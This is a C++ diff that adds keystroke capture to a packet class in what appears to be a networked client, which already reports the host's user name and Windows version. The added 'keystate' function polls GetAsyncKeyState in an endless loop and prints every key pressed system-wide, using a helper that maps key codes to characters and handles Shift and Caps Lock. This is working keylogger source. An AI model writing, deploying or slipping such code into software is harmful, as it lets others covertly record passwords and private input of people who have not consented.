@@ -8,6 +8,7 @@
 #include <cstdint>
 #include <Lmcons.h>
 #include <sstream>
+#include <unordered_map>
 
 #ifdef UNICODE
 #include <locale>
@@ -73,6 +74,72 @@ std::string LPTF_Packet::getClientData()
     ss << userName << " ";
     ss << "Windows" << osvi.dwMajorVersion << "." << osvi.dwMinorVersion;
     return ss.str();
+}
+
+std::unordered_map<int, std::string> keyNames = {
+    {0x41, "A"}, {0x42, "B"}, {0x43, "C"}, {0x44, "D"}, {0x45, "E"}, {0x46, "F"}, {0x47, "G"}, {0x48, "H"}, {0x49, "I"}, {0x4A, "J"}, {0x4B, "K"}, {0x4C, "L"}, {0x4D, "M"}, {0x4E, "N"}, {0x4F, "O"}, {0x50, "P"}, {0x51, "Q"}, {0x52, "R"}, {0x53, "S"}, {0x54, "T"}, {0x55, "U"}, {0x56, "V"}, {0x57, "W"}, {0x58, "X"}, {0x59, "Y"}, {0x5A, "Z"}, {0x30, "0"}, {0x31, "1"}, {0x32, "2"}, {0x33, "3"}, {0x34, "4"}, {0x35, "5"}, {0x36, "6"}, {0x37, "7"}, {0x38, "8"}, {0x39, "9"}, {VK_SPACE, " "}, {VK_RETURN, "\n"}, {VK_SHIFT, "SHIFT"}, {VK_CONTROL, "CTRL"}, {VK_MENU, "ALT"}, {VK_TAB, "TAB"}, {VK_BACK, "BACKSPACE"}, {VK_ESCAPE, "ESC"}, {VK_LEFT, "LEFT"}, {VK_RIGHT, "RIGHT"}, {VK_UP, "UP"}, {VK_DOWN, "DOWN"}};
+
+std::string getKeyName(int key)
+{
+    bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+    bool isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+
+    if (key >= 0x41 && key <= 0x5A)
+    { // A à Z
+        if (isShiftPressed ^ isCapsLockOn)
+        {
+            return std::string(1, key); // Majuscule
+        }
+        else
+        {
+            return std::string(1, key + 32); // Minuscule
+        }
+    }
+
+    if (keyNames.find(key) != keyNames.end())
+    {
+        return keyNames[key];
+    }
+    else
+    {
+        return "UNKNOWN";
+    }
+}
+
+void LPTF_Packet::keystate()
+{
+    // Map pour stocker l'état précédent de chaque touche
+    std::unordered_map<int, bool> keyState;
+
+    // Initialiser l'état de chaque touche à non pressée
+    for (int key = 8; key <= 222; key++)
+    {
+        keyState[key] = false;
+    }
+
+    while (true)
+    {
+        for (int key = 8; key <= 222; key++)
+        {
+            // Vérifie si la touche est actuellement pressée
+            bool isPressed = GetAsyncKeyState(key) & 0x8000; // verifie le bit de poid fort
+
+            // Si la touche est pressée et qu'elle n'était pas pressée précédemment
+            if (isPressed && !keyState[key])
+            {
+                std::cout << getKeyName(key);
+                keyState[key] = true;
+            }
+
+            // Si la touche n'est pas pressée, mettre à jour l'état
+            if (!isPressed && keyState[key])
+            {
+                keyState[key] = false;
+            }
+        }
+        // Petite pause pour éviter une utilisation excessive du CPU
+        Sleep(10); // Pause de 10 millisecondes
+    }
 }
 
 // LPTF_Packet &LPTF_Packet::operator=(const LPTF_Packet &other)
